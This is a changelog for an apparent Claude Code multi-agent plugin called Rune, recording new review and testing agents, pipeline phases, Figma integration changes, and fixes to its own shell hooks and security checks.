- **EDGE-001: Fix unbound variable crash in enforce-polling.sh** — Initialize `RUNE_CURRENT_CFG` with safe default before sourcing `resolve-session-identity.sh`, preventing `set -u` crashes in Bash 3.2-5.x when helper file fails
- **EDGE-003: Fix grace period fallback in process-tree.sh** — Changed fallback chain from hardcoded `sleep 1` to validated `sleep "${grace:-2}"`, using configured grace value instead of arbitrary minimum
- **BIZL-001: Add SYNC-CRITICAL warning to arc-phase-constants.md** — Documents PHASE_ORDER dual-sync constraint between JavaScript reference and Bash dispatch array
- **BIZL-002: Mark DECREE-001 assertion as reference-only** — Added "REFERENCE ONLY — not executed at runtime" annotation to `assertPhaseOrderCorrect()` pseudocode
- **INTG-001: Fix agent path references in test-phase.md** — Corrected 3 references from `agents/testing/` to `registry/testing/` for unit-test-runner.md and test-failure-analyst.md
- **INTG-002: Add unused advisory to echo-append.sh and echo-promote.sh** — Marked `rune_echo_append()` and `rune_echo_promote()` as reserved for future integration with v3.0.0 removal target
- **INTG-003: Add usage documentation to run-artifacts.sh** — Added consumer reference header listing actual source sites (strive, roundtable-circle, devise)
- **VEIL-003: Document mutex TOCTOU race as accepted risk** — Added risk annotation in `enforce-teams.sh` explaining atomic mkdir + fail-closed fallback
- **VEIL-004: Document force-reply best-effort limitation** — Added note in `engines.md` that teammates in long-running tool calls may not process shutdown_request immediately
- **VEIL-005: Add PPID session isolation advisory** — Documented `session_id` as authoritative mechanism over `PPID` in `enforce-teams.sh`
- **EDGE-002: Document temporal validation grace window limitation** — Added advisory in `validate-discipline-proofs.sh` about 5s window not covering hook timing gap

## [2.29.2] - 2026-03-28

### Fixed
- **SEC-001: Remove pipe from cc-inspect.sh allowlist** — `ver()` function's character allowlist included `|` (pipe), enabling potential command chaining via `bash -c`. Removed pipe from regex; version commands fall through safely to "installed (version unknown)"
- **SEC-002: Replace bash -c with word-split execution in discipline proofs** — `proof_test_passes()` and `proof_builds_clean()` in `execute-discipline-proofs.sh` used `bash -c "$cmd"` for agent-configured commands. Replaced with direct word-split `$cmd` execution (same pattern as `verify-storybook-build.sh`). Allowlist + binary allowlist still enforce safety
- **SEC-003: Document _SPAT_LIST as mandatory primary interface** — Added clarifying comment in `sensitive-patterns.sh` that `_SPAT_LIST` is the required interface for all consumers, not the Bash 4+-only `SENSITIVE_PATTERNS` associative array
- **QUAL-003: DRY — deduplicate resolve_path() in on-teammate-idle.sh** — Replaced inline `resolve_path()` (grealpath → realpath → readlink -f chain) with `source lib/platform.sh` + delegation to `_resolve_path()`, keeping fallback for unavailable platform.sh
- **QUAL-004: Fix hardcoded ~/.claude/ in session-start.sh comment** — Updated documentation comment to use `$CHOME/plugins/cache/...` for consistency with CHOME pattern

## [2.29.1] - 2026-03-28

### Fixed
- **CKPT-001: Checkpoint path drift hardening** — LLM could write checkpoint to `.rune/arc-checkpoint.local.md` instead of canonical `.rune/arc/{id}/checkpoint.json`, breaking stop hook phase loop and `--resume` search
  - Added IRON LAW constraint in `arc-checkpoint-init.md` with post-write verification (file exists + state file path match)
  - Added `mkdir -p` and `checkpointPath` variable to prevent flat-file drift
  - Added GUARD 5.6 in `arc-phase-stop-hook.sh` — validates `.json` extension + canonical path pattern, 3-strategy recovery cascade (extract arc id → scan → fallback)
  - Added drifted-path fallback in `_find_arc_checkpoint()` (`stop-hook-common.sh`) for `--resume` backwards compatibility
  - Enforced `.json` extension rule: JSON content MUST use `.json` extension, never `.md`

## [2.29.0] - 2026-03-28

### Added
- **Supply chain risk audit**: New `supply-chain-sentinel` review agent (`agents/review/supply-chain-sentinel.md`) — evaluates each direct dependency across 6 risk dimensions: maintainer count, last commit date, CVE history, download trajectory, bus factor, and security policy presence. Supports npm, pip, cargo, go mod, and composer. Produces `SUPPLY-` prefixed findings with composite risk scores
- **`/rune:supply-chain-audit` skill**: New user-invocable skill for standalone dependency risk analysis — auto-detects package manager, extracts direct dependencies, queries registry and GitHub APIs for health signals, generates structured risk report with severity ratings and alternative suggestions
- **Forge Gaze topic registration**: `supply-chain-sentinel` registered in Forge Gaze topic registry under `supply-chain` topic with 0.95 affinity for dependency-related plan sections
- **Talisman config**: New `supply_chain` section with `enabled` (default: true), `max_dependencies` (default: 50), `risk_threshold` (`low`/`medium`/`high`), and `registries` override
- **Agent registry**: `supply-chain-sentinel` added to `known-rune-agents.sh` (plugin total: 149 agents — 106 core + 43 extended)

## [2.28.0] - 2026-03-28

### Added
- **Variant analysis**: New `variant-hunter` investigation agent (`agents/investigation/variant-hunter.md`) — given a confirmed finding, systematically searches the codebase for similar patterns using 5-step progressive generalization (understand → exact match → abstract → generalize → triage). Produces VARIANT-prefixed findings with search statistics
- **`/rune:variant-hunt` skill**: New user-invocable skill for standalone variant hunting — accepts finding ID, pattern description, or TOME path. Spawns variant-hunter agents with team lifecycle management
- **Talisman config**: New `variant_analysis` section with `enabled` (default: false), `auto_trigger` (`p1_only` | `p1_p2` | `all`), and `max_variants_per_finding` (default: 10)
- **Agent registry**: `variant-hunter` added to `known-rune-agents.sh` (plugin total: 148 agents — 105 core + 43 extended)

## [2.27.0] - 2026-03-28

### Added
- **Audit context building**: New `context-builder` research agent (`agents/research/context-builder.md`) — performs deep architectural comprehension (entry points, trust boundaries, invariants, state flows) before vulnerability hunting begins. Pure comprehension agent — does NOT identify vulnerabilities
- **Audit Phase 0.45**: Context builder integration in audit workflow — spawns before Ash summoning, produces structured context map injected into every Ash's `## Shared Audit Context` prompt section. Graceful degradation on timeout
- **Talisman config**: New `audit.context_building` (`"auto"` | `"always"` | `"never"`, default: `"auto"` = deep only) and `audit.context_timeout` (default: 300s) configuration keys
- **Agent registry**: `context-builder` added to `known-rune-agents.sh` (plugin total: 147 agents — 104 core + 43 extended)

## [2.26.0] - 2026-03-28

### Added
- **Property-based testing**: New PBT pattern detection for `trial-forger` agent — detects roundtrip, validator, idempotent, sorting, data structure, and mathematical patterns suitable for property-based testing. Generates invariant tests alongside example-based tests using fast-check (JS/TS), hypothesis (Python), proptest (Rust), or rapid (Go)
- **PBT reference library**: New reference document (`skills/testing/references/property-based-testing.md`) with per-language code templates, generator tables, detection protocol, and common property patterns
- **PBT testing tier**: New Tier 1.5 in arc Phase 7.7 testing pipeline — runs between unit (Tier 1) and integration (Tier 2) tests when PBT library detected. 2x timeout multiplier for CPU-intensive property generation. Graceful skip when no PBT library installed

## [2.25.0] - 2026-03-27

### Added
- **Insecure defaults detection**: New review dimension for `ward-sentinel` agent — detects fail-open configuration patterns (CWE-1188) across 6 categories: hardcoded fallback secrets, default credentials, weak cryptographic defaults, permissive access control defaults, debug/dev mode defaults, and missing security headers. Inspired by Trail of Bits' `insecure-defaults` plugin
- **Insecure defaults pattern library**: New reference document (`agents/review/references/insecure-defaults-patterns.md`) with comprehensive per-language patterns (JavaScript/TypeScript, Python, Go, Ruby, Rust), severity guide, and false positive guidance

## [2.24.1] - 2026-03-27

### Fixed
- **Forge enrichment delta validation**: Add STEP 3.5 to `arc-phase-forge.md` that compares enriched plan size against original — logs `Forge enrichment delta: +N lines` on success, warns when enriched plan is not larger (detecting ghost forges with sub-second completion times)

## [2.24.0] - 2026-03-27

### Added
- **Phase necessity audit dimension**: New `--mode necessity` for `/rune:self-audit` — evaluates whether each arc phase still contributes measurable quality improvement. Inspired by Anthropic's harness design principle: "every component encodes an assumption about model limitations worth stress testing"
- **necessity-analyzer agent**: New meta-QA agent (`agents/meta-qa/necessity-analyzer.md`) — analyzes arc checkpoints across multiple runs to compute per-phase necessity scores (0.0-1.0) using weighted formula: artifact_value, quality_delta, skip_rate, uniqueness. Produces ESSENTIAL / REVIEW / CANDIDATE_FOR_REMOVAL recommendations
- **Necessity report template**: New reference (`skills/self-audit/references/necessity-report-template.md`) — per-phase table with score breakdown, trend analysis, model-version context, and caveats
- **Agent registry**: `necessity-analyzer` added to `known-rune-agents.sh` (plugin total: 146 agents — 103 core + 43 extended)

## [2.23.1] - 2026-03-27

### Changed
- **Micro-evaluator default enabled**: `work.micro_evaluator.enabled` now defaults to `true` — per-task quality feedback is active out-of-the-box for all strive sessions. Disable via `talisman.yml` if unwanted

## [2.23.0] - 2026-03-27

### Added
- **Per-task micro-evaluator**: New `micro-evaluator` agent (`agents/work/micro-evaluator.md`) — lightweight Haiku-model quality evaluator that reviews worker diffs per-task and provides structured APPROVE/REFINE/PIVOT feedback before task completion. Inspired by Anthropic's Generator-Evaluator harness pattern
- **Micro-evaluator orchestration**: Strive Phase 2 conditionally spawns micro-evaluator teammate when `work.micro_evaluator.enabled` is true. File-based signal communication (zero context pressure). Non-blocking 30s timeout with auto-approve fallback
- **Worker feedback protocol**: Worker prompts (rune-smith + trial-forger) include new step 7.6 — micro-evaluation feedback reception with REFINE iteration (max 2) and PIVOT approach change support
- **Talisman configuration**: New `work.micro_evaluator` section with `enabled` (default: false), `max_iterations` (2), `timeout_ms` (30000), `model` (haiku), and per-dimension toggles (pattern_compliance, error_handling, edge_cases, naming_consistency)
- **Quality gates integration**: Phase 3.8 micro-evaluator summary collects verdict distribution and iteration metrics. Completion matrix includes evaluator iterations per task. Metrics feed into Echo Persist for cross-session learning
- **Agent registry**: `micro-evaluator` added to `known-rune-agents.sh` and Phase 6 cleanup fallback array (plugin total: 145 agents)

## [2.22.0] - 2026-03-27

### Added
- **arc-quick evaluator loop**: Work phase now iterates with `evaluateIteration()` — runs ward checks and quality signal detection between strive passes. Breaks on PASS, stagnation (findings not decreasing), or `max_iterations` (default 3). Configurable via `talisman.yml` → `arc.quick.max_iterations`, `arc.quick.skip_evaluate`, `arc.quick.evaluate_timeout_ms`
- **Iteration history in summary**: Quick pipeline summary now includes per-iteration verdict table and quality trajectory (IMPROVING/STAGNATING/DEGRADING/MIXED)
- **P1-conditional mend recommendation**: Summary only suggests `/rune:mend` when appraise finds P1-severity findings

## [2.21.5] - 2026-03-27

### Fixed
- **FLAW-001**: Fix state file destruction on transient `mv` failure in `arc-stop-hook-common.sh` — error handler was removing both temp AND original state file, stalling arc pipelines permanently
- **FLAW-002**: Add missing ReDoS protection (nested quantifier rejection + `timeout 1` wrapper) to second pattern validation loop in `enforce-bash-timeout.sh` — first loop had guards, second was unprotected
- **BACK-001**: Fix information leakage in echo-search MCP error handler — internal exception messages (file paths, SQL errors) were returned verbatim to MCP clients. Now returns generic "Internal server error" with `logger.exception()` for debugging
- **BACK-002**: Add `_NODE_ID_PATTERN` validation to `get_images()` in figma-to-react `figma_client.py` — `get_nodes()` validated IDs but `get_images()` passed them directly to Figma API without validation
- **FLAW-005**: Add numeric validation guard for stamp file in `mcp-pkg-manager.sh` — corrupted stamp files caused repeated `npm list -g` calls on every MCP server startup

## [2.21.4] - 2026-03-27

### Fixed
- **MCP-PROTECT-001**: Fix cleanup hooks killing MCP/LSP server processes. Root cause: `node|claude|claude-*` process name filter matched MCP servers (which are also `node` processes). Added `--stdio` cmdline detection to skip MCP/LSP servers in all kill paths:
  - `process-tree.sh`: New `_is_mcp_server()` function, skip in both SIGTERM and SIGKILL phases
  - `session-team-hygiene.sh`: Inline `--stdio` check before SIGTERM
  - 21 pseudocode `.md` files + `arc-phase-stop-hook.sh`: Updated 49 inline kill patterns
- **MCP-PROTECT-002**: Add `RUNE_DISABLE_AUTO_CLEANUP` env var (default: `1` = disabled) as kill switch for all process cleanup hooks (`on-session-stop.sh`, `detect-workflow-complete.sh`, `session-team-hygiene.sh`). Set to `0` to opt-in to auto-cleanup
- **POLL-002**: Change `RUNE_DISABLE_POLL_GUARD` default from `0` (enabled) to `1` (disabled) — polling enforcement is now opt-in

## [2.21.3] - 2026-03-27

### Fixed
- **ARC-STALL-001**: Fix "missing phase loop state file" bug causing arc to stall after first phase. Root cause: state file write was a separate pseudocode section in SKILL.md that could be skipped under context pressure or LLM step-shortcutting. Defense-in-depth fix with 3 layers:
  - **Layer 1**: Co-locate state file write with checkpoint init in `arc-checkpoint-init.md` (same code block — can't skip one without the other)
  - **Layer 2**: Add state file write to `arc-resume.md` step 9 (resume path had the same gap)
  - **Layer 3**: Safety guard in SKILL.md "First Phase Invocation" reconstructs state file from checkpoint if missing

## [2.21.2] - 2026-03-27

### Fixed
- **FLAW-001**: Fix double-counting of killed processes in `_rune_kill_tree` (SIGKILL'd survivors no longer counted twice)
- **FLAW-002**: Wrap `validate_session_ownership_strict` in if-guard in `on-stop-failure.sh` (prevents ERR trap as control flow)
- **FLAW-003**: Use same-filesystem temp file for atomic checkpoint writes in `on-stop-failure.sh` (fixes non-atomic `mv` across filesystems in Docker/NFS)
- **WARD-001**: Add `timeout 1` wrapper and nested quantifier rejection for ReDoS protection in `enforce-bash-timeout.sh`
- **WARD-002**: Remove vulnerable printf JSON fallback in `advise-mcp-untrusted.sh` (exit silently when jq unavailable)
- **WARD-003**: Add symlink check before debounce marker write in `enforce-gh-account.sh`
- **WARD-004**: Add missing `umask 077` to `enforce-gh-account.sh` (only enforcement script without it)
- **WARD-009**: Remove single pipe (`|`) from elicitation metachar check to prevent false positives on natural language
- **FLAW-009**: Add symlink rejection on talisman shard read in `track-tool-failure.sh`

## [2.21.1] - 2026-03-27

### Changed
- **MCP server stability**: Replaced raw `npx -y` and `sh -c` wrapper for `figma-context` and `context7` MCP servers with dedicated `start.sh` wrapper scripts using `exec` for proper signal forwarding
- **Auto-install with version management**: New `scripts/lib/mcp-pkg-manager.sh` shared library provides 3-tier launch (global binary → auto-install → npx fallback) with 7-day staleness cache and automatic version mismatch detection
- **Signal handling**: `exec` replaces shell process with server process — Claude Code SIGTERM reaches MCP server directly, preventing orphaned processes and frequent disconnects

### Added
- `scripts/figma-context/start.sh` — Figma Context MCP launcher with fallback chain
- `scripts/context7/start.sh` — Context7 MCP launcher with fallback chain
- `scripts/lib/mcp-pkg-manager.sh` — Shared MCP package version check, cache stamp, and auto-update logic

## [2.21.0] - 2026-03-27

### Added
- **Browser test convergence loop**: 3 new arc phases (7.7.5 `browser_test`, 7.7.6 `browser_test_fix`, 7.7.7 `verify_browser_test`) — automated browser E2E test → fix → verify cycle with convergence detection, mirroring the existing review→mend→verify_mend pattern
- **`--no-browser-test` flag**: Skip the browser test loop independently of `--no-test`
- **Talisman config**: `testing.browser_test` section with `enabled`, `max_cycles`, `max_routes`, `auto_start_server`, `fix_timeout` keys
- **Arc phase timeouts**: `browser_test` (15 min), `browser_test_fix` (15 min), `verify_browser_test` (4 min) configurable via `arc.timeouts`
- **Convergence state**: `browser_test_convergence` checkpoint object with round tracking, max cycles (3), and per-round history
- **Conditional activation**: Browser test loop only runs when frontend files in diff + `agent-browser` CLI available + `testing.tiers.e2e.enabled !== false`
- **Zero-progress detection**: Halts convergence loop when fix round makes no progress (EC-1 pattern)
- **Resume compatibility**: Schema migration adds browser test phases to old checkpoints on `--resume`

### Changed
- **Arc pipeline phase count**: 40 → 43 phases (all docs, guides, READMEs updated)
- **PHASE_ORDER**: Inserted `browser_test`, `browser_test_fix`, `verify_browser_test` after `test_qa`
- **Crash recovery layers**: `PHASE_PREFIX_MAP` and `ARC_TEAM_PREFIXES` include `arc-browser-test-` and `arc-browser-fix-` prefixes
- **Stop hook dispatch**: `_phase_ref()`, `_phase_section_hint()`, `_phase_weight()` handle new browser test phases

## [2.20.0] - 2026-03-26

### Changed
- **Figma MCP provider composition**: Replaced exclusive cascade (pick one provider) with composition model — probes ALL available providers independently and uses each for its strengths (Framelink for compressed data + images, Rune for deep inspection + code generation)
- **Provider detection**: `figma_provider: auto` now probes Framelink AND Rune simultaneously, stores `providers` object in state file
- **Data extraction preference**: Framelink `get_figma_data` preferred for data extraction (~90% compression, better for LLM context) with Rune `figma_fetch_design` as fallback
- **Graceful degradation**: When only one provider available, pipeline degrades gracefully — Framelink-only skips inspect+codegen, Rune-only works as before
- **Setup recommendation**: Both Framelink + Rune recommended for optimal results (was: Rune only)
- **Cross-skill updates**: Composition model applied to design-sync, devise (design-signal-detection), arc (design-extraction, design-prototype), and brainstorm (design-asset-detection)

### Added
- **VSM spec v1.2**: Enhanced fidelity extraction — icon inventory, full borders (width/color/style, not just radius), per-side spacing (pt/pr/pb/pl + margins), separator/divider detection, stacking context (z-index) annotations
- **Separator Detection Algorithm**: LINE nodes and thin RECTANGLE (height≤2px) preserved as `<hr>` separator nodes in Region Tree — never skipped or merged
- **Icon Detection Algorithm**: Extracts icon name, library, size, and color token from Figma INSTANCE and small FRAME/GROUP nodes
- **Full Border Extraction**: `extractFullBorders()` captures stroke width, color, style, and per-side individual strokes — not just border-radius
- **Stacking Context Detection**: Absolute-positioned nodes annotated with z-index inferred from Figma layer order; parent nodes annotated with `relative`
- **Commonly Missed Details Checklist**: Mandatory worker checklist in worker-trust-hierarchy.md — covers borders, dividers, icons, z-index, per-side spacing
- **Fidelity scoring penalties**: Missing dividers (-8), wrong z-index (-10), missing borders (-5), wrong icons (-5), wrong per-side spacing (-3)
- **Naming clarity**: All user-facing references to "Framelink" now include "figma-context-mcp" for disambiguation

## [2.19.0] - 2026-03-26

### Changed
- **Figma MCP provider**: Replaced Official Figma MCP fallback with figma-context-mcp (Framelink) — ~90% data compression, 2 focused tools (`get_figma_data`, `download_figma_images`) instead of 16
- **MCP provider cascade**: Auto-detection now probes rune → framelink → desktop (was rune → official → desktop)
- **`.mcp.json`**: Added `figma-context` server entry (figma-developer-mcp@0.8.0)
- **CLAUDE.md**: Added `figma-context` to MCP Servers table
- **Soft deprecation**: `figma_provider: "official"` logs deprecation warning and falls back to framelink
- **Removed**: `convertToOfficialParams()` helper, all `mcp__plugin_figma_figma__*` tool references
- **CLAUDE.md**: Updated `figma-context` description from "Fallback provider" to "Primary alternative provider" with cascade docs; added `get_figma_data`/`download_figma_images` to Hot/Cold tools table

## [2.18.1] - 2026-03-26

### Changed
- **Design prototype skill**: Refactored team architecture section into dedicated reference file (`team-architecture.md`) for better maintainability

## [2.18.0] - 2026-03-26

### Added
- **Domain inference algorithm**: `inferProjectDomain()` as Phase 5.5 of `discoverDesignSystem()` — analyzes manifest files, directory names, and file patterns to classify projects into 8 domains (ecommerce, saas, healthcare, fintech, media, social, education, productivity)
- **Domain-aware design recommendations**: `domain-design-guide.md` reference with per-domain UX patterns, component priorities, and accessibility requirements for 8 domains
- **Industry-weighted UX scoring**: `getHeuristicWeights(domain)` adjusts UX heuristic evaluation weights based on detected project domain — e.g., fintech emphasizes error prevention, healthcare emphasizes accessibility
- **Design echo search integration**: Echo search now surfaces design-sync and design-prototype learnings for relevant queries
- **Design context enrichment**: `/rune:devise` planning pipeline now includes design system context (detected libraries, tokens, domain) in research phase output

## [2.17.4] - 2026-03-25

### Added
- **Heuristic wiring gap detection**: grace-warden-inspect now runs a 4-layer decision tree (exclusion → pattern existence → grep validation → sibling check) to detect unwired new files when plans lack an explicit `## Integration & Wiring Map` section. MVP patterns: barrel exports (<5% FP) and migration registration (<8% FP)
- **WIRE-H finding prefix**: New `WIRE-H{NNN}` findings for heuristic-detected wiring gaps, distinct from plan-verified `WIRE-NNN`. P2 severity, capped at 5% completion impact in verdict-binder
- **Always-on wiring map generation**: devise synthesize.md now generates `## Integration & Wiring Map` for ALL detail levels including Minimal and `--quick` mode
- **Expanded Anti-Shirking regex**: Catches additional wiring-relevant patterns: `new service`, `new middleware`, `new migration`, `add barrel`, `export from`, `new handler`, `new subscriber`, `add provider`, `register module`
- **Talisman wiring config**: `inspect.detect_wiring_heuristics`, `inspect.wiring_patterns`, `inspect.wiring_exclusions` for controlling heuristic detection behavior
- **`@wire-skip` annotation**: File-level suppression for heuristic findings via `// @wire-skip` in first 5 lines. Does NOT suppress plan-verified WIRE-NNN findings

### Fixed
- **NaN guard on WIRE-H completionImpact**: verdict-binder now derives completionImpact when field is missing from grace-warden output
- **Gap category count**: Updated from "9 categories" to "10 categories" in verdict-binder after adding heuristic wiring gaps

## [2.17.3] - 2026-03-25

### Fixed
- **QA gate infinite retry loop**: `_qa_gate_check()` in `lib/qa-gate-check.sh` now checks the QA phase status before looking for a verdict file. When `qa_gates.enabled: false`, QA phases are skipped via skip_map but the verdict check still ran, found no file, and demoted the parent phase back to "pending" — creating an infinite retry loop that burned through `infra_global_retry_count`

## [2.17.2] - 2026-03-25

### Fixed
- **STRIVE-001 security bypass (FLAW-001, P1)**: Rewrote `enforce-strive-delegation.sh` to use shared `pretooluse-write-guard.sh` library — absolute paths from Claude Code now correctly normalized to relative before case pattern matching. Previously, all case patterns used relative globs that never matched absolute file paths, rendering the security hook non-functional
- **SIGPIPE guard (FLAW-002)**: Added `2>/dev/null || true` to `head -c 1048576` in 6 scripts (`enforce-gh-account.sh`, `validate-test-evidence.sh`, `lib/sensitive-patterns.sh`, `lib/sanitize-text.sh`) — prevents unexpected exit under `set -e` when stdin closes early
- **CWD resolution (FLAW-003, SEC-002)**: `enforce-strive-delegation.sh` now parses CWD from hook input JSON `.cwd` field and canonicalizes via `pwd -P`, fixing incorrect state file lookups in worktree contexts
- **Session isolation (FLAW-004)**: Added `config_dir` + `owner_pid` ownership checks to `enforce-strive-delegation.sh` — prevents cross-session interference per Core Rule 11
- **Symlink rejection (FLAW-005)**: Added `[[ -L ... ]]` guards on state file and checkpoint path reads in `enforce-strive-delegation.sh`
- **`kill -0` pattern (FLAW-006)**: `rune_pid_alive()` in `resolve-session-identity.sh` now uses `&& rc=0 || rc=$?` pattern — safe under `set -e` in any calling context
- **Nullglob state restore (FLAW-007)**: `session-start.sh` and `enforce-readonly.sh` now save/restore nullglob state instead of unconditionally disabling it
- **Kill counter (FLAW-008)**: `process-tree.sh` `rune_kill_process_tree()` now counts SIGTERM'd processes, not just SIGKILL'd
- **mktemp failure handling (FLAW-009)**: `arc-stop-hook-common.sh` warns on mktemp failure instead of deleting the state file
- **Poll guard default (SEC-003)**: `enforce-polling.sh` `RUNE_DISABLE_POLL_GUARD` default changed from `:-1` (disabled) to `:-0` (enabled) — hook was previously a no-op in standard configurations
- **Debounce marker isolation (SEC-004)**: `enforce-gh-account.sh` debounce marker includes `$PPID` fallback when `CLAUDE_SESSION_ID` is unset
- **Trace log isolation (SEC-006)**: `on-session-stop.sh` trace log path includes `-${PPID}` suffix to prevent cross-session log interleaving
- **PLUGIN_ROOT validation (SEC-007)**: `session-start.sh` uses positive allowlist regex instead of incomplete denylist for metacharacter validation
- **JSON fallback escaping (SEC-008)**: `advise-mcp-untrusted.sh` sed-based JSON fallback uses `tr` for control characters (tab, newline, CR)
- **File discovery safety (SEC-009)**: `detect-corrections.sh` uses `find -print0 | xargs -0 ls -t` instead of bare `ls -t *.jsonl`
- **Hardcoded `/tmp` paths (PAT-001/002)**: `torrent/tests/test_channels_e2e.sh` — all 15+ `/tmp/torrent-e2e-*` paths replaced with `${TMPDIR:-/tmp}/torrent-e2e-*`
- **macOS `date +%s%N` (PAT-003)**: `echo-writer.sh` removed broken `date +%s%N` fallback that produces garbage on macOS (literal `N` instead of nanoseconds)
- **Missing `set -e` (PAT-004)**: `torrent/tests/test_channels_e2e.sh` `set -uo pipefail` → `set -euo pipefail`
- **Stale comments (PAT-005/006)**: `session-scanner.sh` and `enforce-team-lifecycle.sh` comments now reference `$CHOME` instead of `~/.claude/`
- **mktemp template (PAT-007)**: `torrent/install.sh` uses `${TMPDIR:-/tmp}/torrent-install-XXXXXX` template
- **declare -A comment (PAT-008)**: `sensitive-patterns.sh` clarifies dual-path design for Bash 3.2/4+ compatibility

## [2.17.1] - 2026-03-25

### Changed
- **UntitledUI conventions**: Update Tailwind CSS v4.1 → v4.2 to match official UntitledUI AGENT.md
- **MCP tools decision tree**: Add icon search guidance via `search_components("icon keyword")`

## [2.17.0] - 2026-03-25

### Added
- **StopFailure hook handler** — `on-stop-failure.sh` for API error recovery during arc pipeline (AC-1, AC-2, AC-3)
- **Error classification library** — `lib/stop-failure-common.sh` with 4-type classification: RATE_LIMIT, AUTH, SERVER, UNKNOWN

### Fixed
- **Session stop session_id extraction** — `on-session-stop.sh`: Extract session_id from hook input JSON instead of unavailable env vars (AC-4)
- **Self-audit arc loop guard** — `suggest-self-audit.sh`: Guard all 4 arc loop types (phase, batch, hierarchy, issues), not just phase loop (AC-5)

## [2.16.1] - 2026-03-24

### Fixed
- **Arc checkpoint timing**: Guard against negative `duration_ms` values in arc checkpoint timing calculations (#423)
- **Arc checkpoint archival**: Auto-archive stale incomplete arc checkpoints to prevent accumulation of orphaned checkpoint files (#424)

## [2.16.0] - 2026-03-24

### Added
- **Design Phase QA — Tier 3 Full Discipline Parity** — Comprehensive improvements bringing design phases to full parity with core arc phases:
  - Anti-pattern detection rules (DES-AP-01 through DES-AP-05) and DES-MOT-01 composite "going through the motions" scoring in `design-qa-verifier` agent
  - New `design-qa-anti-patterns.md` reference file with detection logic, examples, and threshold rationale
  - Design-specific Inner Flame role checklists for Proto-Worker, Design-Iterator, and Design-Implementation-Reviewer roles
  - Structured JSON artifact output and confidence scoring (4-dimension weighted algorithm with weight redistribution) for Storybook verification (Phase 3.3)
  - Mend-compatible bridge format (`design-findings-mend-compat.json`) for DES- findings cross-phase resolution
  - Per-component VSM quality scoring (6-dimension checks, HIGH/MEDIUM/LOW tiers) in design extraction (Phase 3)

### Changed
- **Discipline opt-in default**: `design_sync.discipline.enabled` now defaults to `true` when `design_sync.enabled` is `true` (was explicit opt-in). Explicit `false` still works as opt-out.

## [2.15.0] - 2026-03-24

### Added
- **Design Phase QA — Tier 2 Structured Gates** — Comprehensive QA discipline for design phases:
  - New `design-qa-verifier` agent (`agents/qa/design-qa-verifier.md`) for independent design phase QA verification — validates prototype artifacts, Storybook stories, and fidelity criteria before advancing
  - Extended arc QA gate scope to include `design_verification` phase (7 gated phases total)
  - Design finding resolution tracking in Phase 7.6 (design-iterator) — structured resolution report per DES- finding
  - Design fidelity metrics surfaced in ship phase PR body — prototype count, library matches, fidelity score, LOW confidence component warnings
  - Pre-prototype confidence assessment (STEP B.5) in Phase 3.2 — evaluates each component's readiness before spawning synthesis workers, writes `confidence-report.json` with HIGH/MEDIUM/LOW trust levels
- **Agent count updated: 145 (102 core + 43 extended)**

## [2.14.0] - 2026-03-24

### Added
- **Design Phase QA — Tier 1 Quick Wins** — Close critical gaps in design phase discipline engineering:
  - Inner Flame self-review protocol injected into proto-worker spawn prompts (Phase 3.2)
  - Inner Flame self-review protocol injected into design-iterator spawn prompts (Phase 7.6)
  - Mandatory artifact validation (step 7.5) in Phase 5.2 with fallback artifact creation
  - New `proto-worker` agent definition (`agents/work/proto-worker.md`) with structured prompt, output contract, and trust hierarchy
  - New `design-iterator` agent definition (`agents/work/design-iterator.md`) with screenshot-analyze-fix loop, DES- criteria awareness, and regression detection (F10)
  - Agent count updated: 144 (101 core + 43 extended)

## [2.13.0] - 2026-03-24

### Added
- **Semantic component detection for design pipeline** — 3-tier heuristic classifier (name-based, structural, component property inference) with 13 component roles for Figma-to-code pipeline (#419):
  - New `semantic_classifier.py` with 3-tier classification (name → structure → properties)
  - 51 unit tests covering all tiers, edge cases, and backward compatibility
  - Typography field serialization + classifier integration in `core.py` `to_react()` pipeline
  - `semantic_role` and `semantic_confidence` fields added to `FigmaIRNode`
  - Semantic role → HTML tag mapping in `react_generator.py`
  - Token mapping capability in `style_builder.py` using `snap_color()` infrastructure
  - VSM Section 9 "Semantic Component Map" (optional, backward compatible)
  - Worker semantic context injection (Step 3.5) + quality checklist item
  - Design verification 7th dimension "Semantic Completeness" (15% weight)

## [2.12.0] - 2026-03-24

### Added
- **UntitledUI pipeline enhancement** — 8 tasks across design system infrastructure (#418):
  - `applyV4Syntax()` token transformation for Tailwind v4.1 alignment
  - 8 new Semantic IR ComponentTypes (+ `modal→dialog` alias)
  - 56 curated icon mapping entries with style suffix detection
  - Enriched Figma framework signatures (compound detection + conclusive match)
  - Page templates wired into design-prototype pipeline
  - Doc pack + token map for UntitledUI

### Fixed
- **Convention conflict resolution** — Tailwind v4.1 syntax alignment in UntitledUI conventions
- **Convention truncation** — Section reordering and limit increase to prevent truncated agent conventions

## [2.11.1] - 2026-03-24

### Fixed
- **RUNE_PLUGIN_ROOT env bridging** — `CLAUDE_PLUGIN_ROOT` is only available in hook script execution context, not in Bash() tool calls from skills. Added `RUNE_PLUGIN_ROOT` injection via `CLAUDE_ENV_FILE` in SessionStart hook (`session-start.sh`). All 57 skill/command/agent `.md` files updated from `${CLAUDE_PLUGIN_ROOT}` to `${RUNE_PLUGIN_ROOT}` in Bash() pseudocode contexts. Hook scripts (`.sh`) unchanged — they correctly receive `CLAUDE_PLUGIN_ROOT` from Claude Code runtime. Fixes "no such file or directory: /scripts/lib/..." errors when skills invoke plugin scripts via Bash().
- **session-start.sh validation** — Fixed `PLUGIN_ROOT` validation that rejected plugin cache paths (`~/.claude/plugins/cache/.../rune/2.11.0`). Replaced string pattern match (`*/plugins/rune*`) with directory existence check (`-d "$PLUGIN_ROOT/scripts"`), which works for both dev (`/repo/plugins/rune`) and installed (`~/.claude/plugins/cache/.../rune/X.Y.Z`) paths.

## [2.11.0] - 2026-03-23

### Changed
- Version bump to 2.11.0 — consolidates testing pipeline architecture, arc stability fixes, and ship workflow improvements from 2.10.x series

## [2.10.8] - 2026-03-23

### Fixed
- **arc-phase-stop-hook.sh: add `test` and `test_qa` to HEAVY_PHASES** — Test phase consumes massive context (multiple foreground batch agents, fix loops, strategy files) but was not triggering mandatory compaction after completion. This caused context exhaustion before the next phase could be injected, silently killing the arc pipeline. Root cause of "arc stuck after testing phase" reports.
- **arc-phase-test.md: context-aware early exit in batch loop** — Before each test batch, check remaining context % via bridge file. If below 30%, skip all remaining batches and proceed to report generation + checkpoint update. Prevents silent arc death from context exhaustion during long test runs.
